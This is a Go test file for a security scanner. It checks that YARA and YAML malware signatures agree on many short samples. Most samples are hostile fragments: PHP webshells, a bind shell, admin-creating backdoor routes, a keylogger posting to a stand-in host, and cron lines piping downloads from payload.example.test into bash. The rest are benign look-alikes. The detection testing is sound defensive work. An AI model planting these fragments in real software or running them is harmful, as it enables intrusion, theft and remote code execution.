//go:build yara

package yara_test

import (
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

func TestRepositoryBackdoorRulesMatchScannerParity(t *testing.T) {
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")

	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}

	tests := []struct {
		name           string
		rule           string
		yaraRule       string
		absentYaraRule string
		ext            string
		want           bool
		sample         string
	}{
		{
			name: "self-hiding incident loader",
			rule: "wp_plugin_self_hiding",
			want: true,
			sample: `<?php
ADD_FILTER ('all_plugins', function ($plugins) {
    if (isset ($_GET['sp'])) { return $plugins; }
    $self = plugin_basename (__FILE__);
    UNSET ($plugins[$self]);
    return $plugins;
});`,
		},
		{
			name: "legitimate self-hiding branding plugin",
			rule: "wp_plugin_self_hiding",
			sample: `<?php
add_filter('all_plugins', function ($plugins) {
    if (get_option('agency_hide_branding')) {
        unset($plugins[plugin_basename(__FILE__)]);
    }
    return $plugins;
});
function agency_share_preview() {
    if (isset($_GET['sp'])) { return sanitize_text_field($_GET['sp']); }
}`,
		},
		{
			name: "request flag and separate branding callback",
			rule: "wp_plugin_self_hiding",
			sample: `<?php
add_filter('all_plugins', function ($plugins) {
    if (isset($_GET['sp'])) { audit_share_preview($_GET['sp']); }
    return $plugins;
});
function hide_agency_branding($plugins) {
    $self = plugin_basename(__FILE__);
    unset($plugins[$self]);
    return $plugins;
}`,
		},
		{
			name: "open command route creating administrator",
			rule: "wp_rest_unauth_admin_create",
			want: true,
			sample: `<?php
register_rest_route ($namespace, '/command', array(
    'methods' => 'POST',
    'callback' => 'wpeditor_handle_command',
    'permission_callback' => '__return_true',
));
$id = WP_Create_User ($login, $password, $email);
$user = new WP_User($id);
$user->set_role ('administrator');`,
		},
		{
			name: "membership registration and admin management",
			rule: "wp_rest_unauth_admin_create",
			sample: `<?php
register_rest_route('membership/v1', '/register', array(
    'callback' => 'membership_register',
    'permission_callback' => '__return_true',
));
function membership_register($request) {
    return wp_insert_user(array('user_login' => $request['login'], 'role' => 'subscriber'));
}
function membership_promote($id) {
    if (current_user_can('promote_users')) {
        return wp_update_user(array('ID' => $id, 'role' => 'administrator'));
    }
}`,
		},
		{
			name: "open create-admin route using wp_insert_user",
			rule: "wp_rest_unauth_admin_create",
			want: true,
			sample: `<?php
register_rest_route('wpu/v1', '/create-admin', array(
    'callback' => 'wpu_add_admin',
    'permission_callback' => '__return_true',
));
return wp_insert_user(array(
    'user_login' => $login,
    'user_pass' => $password,
    'role' => 'administrator',
));`,
		},
		{
			name: "protected command followed by open read route",
			rule: "wp_rest_unauth_admin_create",
			sample: `<?php
register_rest_route('membership/v1', '/command', array(
    'callback' => 'membership_admin_command',
    'permission_callback' => 'membership_can_manage_users',
));
register_rest_route('membership/v1', '/plans', array(
    'callback' => 'membership_list_plans',
    'permission_callback' => '__return_true',
));
$id = wp_create_user($login, $password);
(new WP_User($id))->set_role('administrator');`,
		},
		{
			name: "chr chain with PHP whitespace",
			rule: "php_chr_chain_obfuscation",
			want: true,
			sample: `<?php
$key = ImPlOdE ('', ArRaY (ChR (116), ChR (121), ChR (112), ChR (101)));`,
		},
		{
			name:   "ordinary chr calls",
			rule:   "php_chr_chain_obfuscation",
			sample: `<?php $tab = chr(9); $newline = chr(10) . chr(13);`,
		},
		{
			name:   "hex-escaped incident URL",
			rule:   "php_hex_escaped_url",
			want:   true,
			sample: `<?php $url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c";`,
		},
		{
			name:   "plain URL",
			rule:   "php_hex_escaped_url",
			sample: `<?php $url = "https://api.example.test";`,
		},
		{
			name: "sparse escaped URL in a large library",
			rule: "php_hex_escaped_url",
			sample: `<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77";` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "oversized escaped URL in direct fetch",
			rule: "php_hex_escaped_url",
			want: true,
			sample: `<?php $payload = file_get_contents("\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74");` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "oversized staged escaped URL loader",
			rule: "php_hex_escaped_url",
			want: true,
			sample: `<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74";` +
				`$payload = file_get_contents($url); eval($payload);` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "oversized escaped URL include",
			rule: "php_hex_escaped_url",
			want: true,
			sample: `<?php include "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74";` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "oversized escaped URL curl option",
			rule: "php_hex_escaped_url",
			want: true,
			sample: `<?php curl_setopt($handle, CURLOPT_URL, "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74");` +
				`$payload = curl_exec($handle); eval($payload);` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "oversized escaped URL variable include",
			rule: "php_hex_escaped_url",
			want: true,
			sample: `<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74"; require_once $url;` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "oversized escaped URL outbound request",
			rule: "php_hex_escaped_url",
			want: true,
			sample: `<?php $endpoint = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74";` +
				`wp_remote_post($endpoint, array('body' => $_POST));` +
				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
		},
		{
			name: "hardened timthumb with webshot disabled",
			rule: "exploit_timthumb",
			sample: `<?php
if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
class timthumb {
    public static $version = '2.8.14';
    function run() {
        $nullImg = base64_decode("R0lGODlhUAAMAIAAAP8AAP");
        $fp = fopen($this->cachefile, 'rb');
        @fpassthru($fp);
    }
}`,
		},
		{
			name: "webshot-enabled timthumb",
			rule: "exploit_timthumb",
			want: true,
			sample: `<?php
define('WEBSHOT_ENABLED', true);
function timthumb() { /* remote fetch, webshot RCE reachable */ }`,
		},
		{
			name: "backdoored timthumb with injected exec sink",
			rule: "exploit_timthumb",
			want: true,
			sample: `<?php
if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
function timthumb() {}
system($_GET['cmd']);`,
		},
		{
			name: "enter-key comparison near unrelated fetch",
			rule: "exfil_keylogger_js",
			sample: `onKeyDown:function(e){return t.handleKeydown(e)},"handleKeydown",` +
				`(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),` +
				`fetch("https://api.example.test/wp-json/wp/v2/media/"+t).then((function(e){return e.json()}))`,
		},
		{
			name: "KeyCode constant concatenated near unrelated fetch",
			rule: "exfil_keylogger_js",
			sample: `window.onkeydown=function(e){return e};` +
				`var label="enter="+ct.KeyCode.RETURN;fetch("/wp-json/plugin/v1/settings")`,
		},
		{
			name: "keystroke buffer accumulated and posted",
			rule: "exfil_keylogger_js",
			want: true,
			sample: `var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
				`fetch("https://collect.example.test/c",{method:"POST",body:b})});`,
		},
		{
			name: "keystroke serialized into request body",
			rule: "exfil_keylogger_js",
			want: true,
			sample: `document.addEventListener('keypress',function(e){` +
				`fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`,
		},
		// backdoor_htmlmode_eval keys on the payload being rebuilt at runtime,
		// not on the payload variable name (renamed for free) and not on a nearby
		// literal URL (split across a concatenation for free). Both engines must
		// agree on every one of these.
		{
			name: "payload rebuilt through an indirect call",
			rule: "backdoor_htmlmode_eval",
			want: true,
			sample: `<?php
class SMTP {
    public function client_send($data, $command) {
        eval('?>' . call_user_func($_b64, base64_encode($_out)));
    }
}`,
		},
		{
			name:   "payload rebuilt through stacked decoders",
			rule:   "backdoor_htmlmode_eval",
			want:   true,
			sample: `<?php eval('?>' . gzinflate(base64_decode($x)));`,
		},
		{
			name:   "payload rebuilt through a variable function",
			rule:   "backdoor_htmlmode_eval",
			want:   true,
			sample: `<?php eval('?>' . $decoder($p));`,
		},
		{
			name: "Twig-style local template evaluator",
			rule: "backdoor_htmlmode_eval",
			sample: `<?php
final class Environment {
    public function render($name, array $context = [])
    {
        $source = $this->getLoader()->getSourceContext($name)->getCode();
        return eval('?>' . $source);
    }
}`,
		},
		{
			name: "remote fetch beside a local template evaluator",
			rule: "backdoor_htmlmode_eval",
			sample: `<?php
$url = 'https://api.example.test/data';
$response = curl_exec($client);
$template = file_get_contents(__DIR__ . '/views/page.tpl');
eval('?>' . $template);`,
		},
		{
			name: "forbidden-function list is not a bind shell",
			rule: "revshell_php_bind",
			sample: `<?php
return ['forbidden' => [
    'shell_exec(' => 'Avoid shell_exec() - command injection risk.',
    'socket_bind(' => 'Avoid socket_bind() - binds to ports.',
    'socket_listen(' => 'Avoid socket_listen() - opens services.',
]];`,
		},
		{
			name: "socket bind shell",
			rule: "revshell_php_bind",
			want: true,
			sample: `<?php
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, '0.0.0.0', 4444);
socket_listen($sock, 1);
$out = shell_exec($cmd);`,
		},
		{
			name:   "remote fetch without HTML-mode eval",
			rule:   "backdoor_htmlmode_eval",
			sample: `<?php $url = 'https://api.example.test/data'; $content = curl_exec($ch);`,
		},
		{
			name:     "mixed-case cron downloader",
			rule:     "backdoor_cron_reverse_shell",
			yaraRule: "backdoor_cron_downloader",
			ext:      ".cron",
			want:     true,
			sample:   "*/5 * * * * CURL https://payload.example.test/run | BASH\n",
		},
		{
			name:     "mixed-case Bash CGI webshell markers",
			rule:     "cgi_bash_webshell",
			yaraRule: "cgi_webshell_bash",
			ext:      ".cgi",
			want:     true,
			sample:   "#!/bin/bash\nCONTENT-TYPE: text/plain\ncmd=$(BASE64 -d <<< \"$QUERY_STRING\")\nEVAL \"$cmd\"\n",
		},
		{
			name:     "mixed-case WordPress XML-RPC multicall",
			rule:     "exploit_wp_xmlrpc",
			yaraRule: "exploit_wp_xmlrpc_abuse",
			want:     true,
			sample:   "<?php $url = 'XMLRPC.PHP'; $body = '<METHODNAME>SyStEm.MuLtIcAlL</METHODNAME>';",
		},
		{
			name:     "mixed-case CoinHive loader",
			rule:     "miner_coinhive_js",
			yaraRule: "miner_coinhive",
			ext:      ".js",
			want:     true,
			sample:   "const miner = new cOiNhIvE.AnOnYmOuS('site-key');",
		},
		{
			name:     "mixed-case LiteSpeed request shell",
			rule:     "webshell_litespeed_backdoor",
			yaraRule: "webshell_litespeed_disguise",
			want:     true,
			sample:   "<?php /* LiTeSpEeD cache */ EvAl($_REQUEST['x']);",
		},
		{
			name:     "mixed-case WordPress core modification",
			rule:     "wp_core_file_modify",
			yaraRule: "exploit_wp_core_modification",
			want:     true,
			sample:   "<?PHP FiLe_PuT_CoNtEnTs(ABSPATH . 'WP-ADMIN/includes/x.PHP', $payload);",
		},
		{
			name:           "payload staged under an icon cache name",
			rule:           "backdoor_iconcache",
			absentYaraRule: "backdoor_iconcache_disguise",
			want:           true,
			sample:         "<?php\n$f = 'iconcache.ico';\neval(base64_decode($payload));\n",
		},
		{
			name:   "mixed-case payload staged under a favicon name",
			rule:   "backdoor_iconcache",
			want:   true,
			sample: "<?PHP\n$f = 'FaViCoN.IcO';\nEvAl(GzUnCoMpReSs($payload));\n",
		},
		{
			name:   "theme serving its own favicon",
			rule:   "backdoor_iconcache",
			sample: "<?php\nheader('Content-Type: image/x-icon');\nreadfile(__DIR__ . '/favicon.ico');\n",
		},
		{
			name:   "decoding input without executing it",
			rule:   "backdoor_iconcache",
			sample: "<?php\n$data = base64_decode($input);\necho htmlspecialchars($data);\n",
		},
		{
			name:     "mu-plugin loader including a decoded path",
			rule:     "backdoor_wp_muplugin_loader",
			yaraRule: "backdoor_wp_muplugin",
			want:     true,
			sample:   "<?php\n@include(base64_decode('L3RtcC94'));\n$dir = WPMU_PLUGIN_DIR . '/mu-plugins';\n",
		},
		{
			name:     "mixed-case mu-plugin loader including a decoded path",
			rule:     "backdoor_wp_muplugin_loader",
			yaraRule: "backdoor_wp_muplugin",
			want:     true,
			sample:   "<?PHP\n@InClUdE(BaSe64_DeCoDe('L3RtcC94'));\n$dir = '/MU-PLUGINS';\n",
		},
		{
			name:     "mixed-case decoded include outside a mu-plugin loader",
			rule:     "backdoor_wp_muplugin_loader",
			yaraRule: "backdoor_wp_muplugin",
			sample:   "<?PHP\n@InClUdE(BaSe64_DeCoDe('L3RtcC94'));\n$dir = '/ordinary-plugin';\n",
		},
		{
			name:     "lowercase decoded include outside a mu-plugin loader",
			rule:     "backdoor_wp_muplugin_loader",
			yaraRule: "backdoor_wp_muplugin",
			sample:   "<?php\n@include(base64_decode('L3RtcC94'));\n$dir = '/ordinary-plugin';\n",
		},
		{
			name:     "mu-plugin loader including its own directory",
			rule:     "backdoor_wp_muplugin_loader",
			yaraRule: "backdoor_wp_muplugin",
			sample:   "<?php\nforeach (glob(WPMU_PLUGIN_DIR . '/mu-plugins/*.php') as $f) { include_once $f; }\n",
		},
		{
			name:   "mu-plugin invoking a command sink",
			rule:   "backdoor_wp_muplugin",
			want:   true,
			sample: "<?php\n// wp-content/mu-plugins/loader.php\nexec($command);\n",
		},
		{
			name:     "JavaScript documentation of a decoded mu-plugin include",
			rule:     "backdoor_wp_muplugin_loader",
			yaraRule: "backdoor_wp_muplugin",
			ext:      ".js",
			sample:   "const example = `@include(base64_decode($path)); // mu-plugins`;\n",
		},
		{
			name:     "gsocket persistence disguising its process name",
			rule:     "gsocket_persistence",
			yaraRule: "gsocket_cron_persistence",
			want:     true,
			sample:   "#!/bin/sh\n# SEED PRNG\nexec -a '[defunct-kernel]' ./gs-netcat\n",
		},
		{
			name:     "mixed-case gsocket persistence marker",
			rule:     "gsocket_persistence",
			yaraRule: "gsocket_cron_persistence",
			want:     true,
			sample:   "#!/bin/sh\n# seed prng\nexec -a '[DEFUNCT-KERNEL]' ./gs-netcat\n",
		},
		{
			name:     "script seeding a PRNG for reproducible output",
			rule:     "gsocket_persistence",
			yaraRule: "gsocket_cron_persistence",
			sample:   "#!/bin/sh\n# SEED PRNG for reproducible test vectors\nopenssl rand -hex 16\n",
		},
		{
			name:     "assert used to execute request input",
			rule:     "obfuscation_assert_string",
			yaraRule: "obfuscation_assert_exec",
			want:     true,
			sample:   "<?php\nassert(base64_decode($_POST['x']));\n",
		},
		{
			name:     "mixed-case assert used to execute request input",
			rule:     "obfuscation_assert_string",
			yaraRule: "obfuscation_assert_exec",
			want:     true,
			sample:   "<?PHP\nAsSeRt(StRiPsLaShEs($_POST['x']));\n",
		},
		{
			name:     "assert used as an ordinary invariant check",
			rule:     "obfuscation_assert_string",
			yaraRule: "obfuscation_assert_exec",
			sample:   "<?php\nassert(is_array($config), 'config must be an array');\n",
		},
		{
			name:     "JavaScript documentation of assert decoding",
			rule:     "obfuscation_assert_string",
			yaraRule: "obfuscation_assert_exec",
			ext:      ".js",
			sample:   "const blocked = 'assert(base64_decode($payload))';\n",
		},
		{
			name:   "hex unpack feeding execution",
			rule:   "obfuscation_compact_unpack",
			want:   true,
			sample: "<?php\n$h = unpack(\"H*\", $blob);\neval($h[1]);\n",
		},
		{
			name:   "mixed-case hex unpack feeding execution",
			rule:   "obfuscation_compact_unpack",
			want:   true,
			sample: "<?PHP\n$h = UnPaCk(\"h*\", $blob);\nAsSeRt($h[1]);\n",
		},
		{
			name:   "hex unpack used for a checksum",
			rule:   "obfuscation_compact_unpack",
			sample: "<?php\n$hex = unpack(\"H*\", $binary);\nprintf('checksum: %s', $hex[1]);\n",
		},
		{
			name:   "JavaScript documentation of hex unpack execution",
			rule:   "obfuscation_compact_unpack",
			ext:    ".js",
			sample: "const example = 'unpack(\"H*\", $blob); eval($h[1]);';\n",
		},
		{
			name:     "open_basedir reset to empty",
			rule:     "php_open_basedir_override",
			yaraRule: "exploit_open_basedir_escape",
			want:     true,
			sample:   "<?php\nini_set('open_basedir', '');\n",
		},
		{
			name:     "mixed-case comment-separated open_basedir reset",
			rule:     "php_open_basedir_override",
			yaraRule: "exploit_open_basedir_escape",
			want:     true,
			sample:   "<?PHP\nInI_SeT/**/(/**/'OpEn_BaSeDiR'/**/,/**/'/'/**/);\n",
		},
		{
			name:     "open_basedir narrowed to real paths",
			rule:     "php_open_basedir_override",
			yaraRule: "exploit_open_basedir_escape",
			sample:   "<?php\nini_set('open_basedir', '/home/u:/tmp');\nini_set('memory_limit', '256M');\n",
		},
		{
			name:     "JavaScript documentation of an open_basedir reset",
			rule:     "php_open_basedir_override",
			yaraRule: "exploit_open_basedir_escape",
			ext:      ".js",
			sample:   "const blocked = `ini_set('open_basedir', '')`;\n",
		},
		{
			// Stock theme and plugin code names dispensary demo content and a
			// cannabis icon. The bare word must never be a critical webshell.
			name:   "theme demo import listing a dispensary category",
			rule:   "webshell_marijuana",
			sample: `<?php return array('demos' => array('medical-marijuana' => array('name' => 'Medical Marijuana')));`,
		},
		{
			// A separator class including newlines would let one list item ending
			// in the word bridge to the next item starting with "shell".
			name:   "data list with a dispensary entry above a shell entry",
			rule:   "webshell_marijuana",
			sample: "demos:\n  - medical-marijuana\n  - shell-theme\n",
		},
		{
			name:   "json list with a dispensary entry above a shell entry",
			rule:   "webshell_marijuana",
			sample: "[\"medical-marijuana\",\n \"shell\"]",
		},
		{
			name:   "banner with no space before shell",
			rule:   "webshell_marijuana",
			want:   true,
			sample: `<?php /* MarijuanaPHPShell */ system($_GET['c']);`,
		},
		{
			name:   "icon picker naming a cannabis glyph",
			rule:   "webshell_marijuana",
			sample: `<?php $icons = array('fa-cannabis' => 'Marijuana', 'fa-leaf' => 'Leaf');`,
		},
		{
			name:   "Marijuana Shell banner",
			rule:   "webshell_marijuana",
			want:   true,
			sample: `<?php /* MaRiJuAnA ShElL v2 */ if(isset($_POST['cmd'])) { system($_POST['cmd']); }`,
		},
		{
			name:   "compact shell brand without separators",
			rule:   "webshell_marijuana",
			want:   true,
			sample: `<?php $t = "MarijuanaShell"; eval($_REQUEST['c']);`,
		},
		{
			name:   "PHP-qualified shell banner",
			rule:   "webshell_marijuana",
			want:   true,
			sample: `<?php /* Marijuana PHP Shell */ passthru($_GET['c']);`,
		},
		{
			name:   "shell banner with mixed separators",
			rule:   "webshell_marijuana",
			want:   true,
			sample: `<?php /* mArI-JuAnA_pHp-ShElL */ system($_GET['c']);`,
		},
		{
			name:   "download piped to a shell through an intermediate command",
			rule:   "dropper_wget_exec",
			want:   true,
			sample: "wget http://payload.example.test/p | tee /tmp/p | bash\n",
		},
		{
			name:   "mixed-case download piped through an intermediate command",
			rule:   "dropper_wget_exec",
			want:   true,
			sample: "CuRl http://payload.example.test/p | tee /tmp/p | BaSh\n",
		},
		{
			name:   "download executed before a trailing pipeline stage",
			rule:   "dropper_wget_exec",
			want:   true,
			sample: "curl http://payload.example.test/p | bash | cat\n",
		},
		{
			name:   "commented-out download pipeline",
			rule:   "dropper_wget_exec",
			sample: "# curl http://payload.example.test/p.sh | bash\n",
		},
		{
			name:   "scheduled event running an obfuscated payload",
			rule:   "wp_cron_backdoor",
			want:   true,
			sample: "<?php wp_schedule_event(time(),'hourly','x'); eval(base64_decode($p));\n",
		},
		{
			name:   "mixed-case scheduled event at the bounded gap limit",
			rule:   "wp_cron_backdoor",
			want:   true,
			sample: "<?php WP_SCHEDULE_EVENT($time,'hourly','x')" + strings.Repeat(" ", 800) + "EvAl(BASE64_DECODE($p));\n",
		},
		{
			name:   "scheduled event beyond the bounded gap limit",
			rule:   "wp_cron_backdoor",
			sample: "<?php wp_schedule_event($time,'hourly','x')" + strings.Repeat(" ", 801) + "eval(base64_decode($p));\n",
		},
		{
			name:   "scheduled payload before a later non-matching eval",
			rule:   "wp_cron_backdoor",
			want:   true,
			sample: "<?php wp_schedule_event($time,'hourly','x'); eval(base64_decode($p)); eval($local);\n",
		},
		{
			name:   "mixed-case scheduled event fetching a remote payload",
			rule:   "wp_cron_backdoor",
			want:   true,
			sample: "<?PHP WP_SCHEDULE_EVENT($time,'hourly','x'); $p = FILE_GET_CONTENTS('HTTPS://payload.example.test/p'); SyStEm($p);\n",
		},
		{
			name:   "scheduled event calling a local maintenance function",
			rule:   "wp_cron_backdoor",
			sample: "<?php wp_schedule_event(time(),'hourly','my_task');\nfunction my_task(){ update_option('x',1); }\n",
		},
		{
			// The rule needs >= 10 CJK codepoints next to a link, hidden by CSS.
			name:   "hidden block of CJK keywords wrapping a link",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			want:   true,
			sample: `<div style="display:none">` + strings.Repeat("\u4e2d\u6587\u5185\u5bb9", 4) + ` <a href="https://spam.example.test/x">x</a></div>`,
		},
		{
			name:   "hidden block of CJK keywords with mixed-case link markup",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			want:   true,
			sample: `<DIV STYLE="DISPLAY:NONE">` + strings.Repeat("\u4e2d", 10) + ` <A HREF="HTTPS://spam.example.test/x">x</A></DIV>`,
		},
		{
			name:   "XHTML document with hidden CJK link spam",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			want:   true,
			sample: `<?xml version="1.0"?><html><div style="display:none">` + strings.Repeat("\u4e2d", 10) + `<a href="https://spam.example.test">x</a></div></html>`,
		},
		{
			name:   "visible CJK content linking out",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			sample: `<div>` + strings.Repeat("\u4e2d\u6587\u5185\u5bb9", 4) + ` <a href="https://ok.example.test/x">x</a></div>`,
		},
		{
			name:   "CJK lower boundary",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			want:   true,
			sample: `<div style="display:none">` + strings.Repeat("\u4e00", 10) + `<a href="https://spam.example.test">x</a></div>`,
		},
		{
			name:   "CJK upper boundary",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			want:   true,
			sample: `<div style="display:none">` + strings.Repeat("\u9fff", 10) + `<a href="https://spam.example.test">x</a></div>`,
		},
		{
			name:   "CJK UTF-8 plane transitions",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			want:   true,
			sample: `<div style="display:none">` + strings.Repeat("\u4fff\u5000\u8fff\u9000", 3) + `<a href="https://spam.example.test">x</a></div>`,
		},
		{
			name:   "codepoint before CJK range",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			sample: `<div style="display:none">` + strings.Repeat("\u4dff", 10) + `<a href="https://spam.example.test">x</a></div>`,
		},
		{
			name:   "codepoint after CJK range",
			rule:   "spam_chinese_seo",
			ext:    ".html",
			sample: `<div style="display:none">` + strings.Repeat("\ua000", 10) + `<a href="https://spam.example.test">x</a></div>`,
		},
		{
			name:   "JavaScript catalogue containing hidden CJK link text",
			rule:   "spam_chinese_seo",
			ext:    ".js",
			sample: `const css='display:none'; const help='` + strings.Repeat("\u4e2d", 10) + ` href="https://docs.example.test"';`,
		},
		{
			name:   "translation catalogue containing hidden CJK link text",
			rule:   "spam_chinese_seo",
			ext:    ".po",
			sample: `msgid "display:none ` + strings.Repeat("\u4e2d", 10) + ` href='https://docs.example.test'"`,
		},
		{
			name:   "binary upload containing hidden CJK link text",
			rule:   "spam_chinese_seo",
			ext:    ".bin",
			sample: "\x00\x01\xffdisplay:none " + strings.Repeat("\u4e2d", 10) + ` href="https://docs.example.test"`,
		},
		{
			name:   "kana keyword stuffing beside pharma spam",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			want:   true,
			sample: `<p>` + strings.Repeat("\u3042\u3044\u3046\u3048\u304a", 3) + ` viagra online</p>`,
		},
		{
			name:   "kana keyword stuffing with mixed-case keyword",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			want:   true,
			sample: `<P>` + strings.Repeat("\u3042", 10) + ` ViAgRa online</P>`,
		},
		{
			name:   "ordinary kana paragraph",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			sample: `<p>` + strings.Repeat("\u3042\u3044\u3046\u3048\u304a", 3) + ` normal content</p>`,
		},
		{
			name:   "kana lower boundary",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			want:   true,
			sample: `<p>` + strings.Repeat("\u3040", 10) + ` casino</p>`,
		},
		{
			name:   "kana upper boundary",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			want:   true,
			sample: `<p>` + strings.Repeat("\u30ff", 10) + ` casino</p>`,
		},
		{
			name:   "kana UTF-8 byte transitions",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			want:   true,
			sample: `<p>` + strings.Repeat("\u307f\u3080\u30bf\u30c0", 3) + ` casino</p>`,
		},
		{
			name:   "CJK boundaries in Japanese spam rule",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			want:   true,
			sample: `<p>` + strings.Repeat("\u4e00\u9fff", 5) + ` casino</p>`,
		},
		{
			name:   "codepoint before kana range",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			sample: `<p>` + strings.Repeat("\u303f", 10) + ` casino</p>`,
		},
		{
			name:   "codepoint after kana range",
			rule:   "spam_japanese_seo",
			ext:    ".html",
			sample: `<p>` + strings.Repeat("\u3100", 10) + ` casino</p>`,
		},
		{
			name:   "translation catalogue containing Japanese casino text",
			rule:   "spam_japanese_seo",
			ext:    ".po",
			sample: `msgid "` + strings.Repeat("\u3042", 10) + ` casino"`,
		},
		{
			name:   "binary catalogue containing Japanese casino text",
			rule:   "spam_japanese_seo",
			ext:    ".mo",
			sample: "\xde\x12\x04\x95\x00\x00" + strings.Repeat("\u3042", 10) + " casino",
		},
		{
			name:   "JavaScript catalogue containing Japanese casino text",
			rule:   "spam_japanese_seo",
			ext:    ".js",
			sample: `const translation='` + strings.Repeat("\u3042", 10) + ` casino';`,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			ext := tc.ext
			if ext == "" {
				ext = ".php"
			}
			yaraRule := tc.yaraRule
			if yaraRule == "" {
				yaraRule = tc.rule
			}
			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), ext), tc.rule)
			yaraMatches := yaraScanner.ScanBytes([]byte(tc.sample))
			yaraHit := hasRepositoryYaraRule(yaraMatches, yaraRule)
			if yamlHit != yaraHit {
				t.Fatalf("%s/%s outcome differs: YAML=%t YARA=%t", tc.rule, yaraRule, yamlHit, yaraHit)
			}
			if yamlHit != tc.want {
				t.Errorf("%s outcome = %t, want %t", tc.rule, yamlHit, tc.want)
			}
			if tc.absentYaraRule != "" && hasRepositoryYaraRule(yaraMatches, tc.absentYaraRule) {
				t.Errorf("%s unexpectedly also matched %s", tc.rule, tc.absentYaraRule)
			}
		})
	}
}

func hasSignatureRule(matches []signatures.Match, name string) bool {
	for _, match := range matches {
		if match.RuleName == name {
			return true
		}
	}
	return false
}

func hasRepositoryYaraRule(matches []csmyara.Match, name string) bool {
	for _, match := range matches {
		if match.RuleName == name {
			return true
		}
	}
	return false
}
